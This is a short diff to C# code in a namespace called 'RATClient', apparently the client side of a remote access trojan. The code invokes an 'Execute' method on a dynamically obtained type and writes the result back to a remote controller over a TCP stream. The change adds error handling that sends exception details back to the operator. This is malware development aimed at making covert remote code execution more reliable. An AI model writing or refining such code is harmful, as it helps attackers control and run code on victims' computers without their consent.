@@ -30,10 +30,18 @@ namespace RATClient
                             MethodInfo method = type.GetMethod("Execute");
                             if (method != null)
                             {
-                                object instance = Activator.CreateInstance(type);
-                                object result = method.Invoke(instance, null);
-                                byte[] responseBytes = Encoding.ASCII.GetBytes(result.ToString());
-                                client.GetStream().Write(responseBytes, 0, responseBytes.Length);
+                                try
+                                {
+                                    object instance = Activator.CreateInstance(type);
+                                    object result = method.Invoke(instance, null);
+                                    byte[] responseBytes = Encoding.ASCII.GetBytes(result.ToString());
+                                    client.GetStream().Write(responseBytes, 0, responseBytes.Length);
+                                }
+                                catch (Exception ex)
+                                {
+                                    byte[] errorBytes = Encoding.ASCII.GetBytes("Error: " + ex.ToString());
+                                    client.GetStream().Write(errorBytes, 0, errorBytes.Length);
+                                }
                                 break;
                             }
                         }
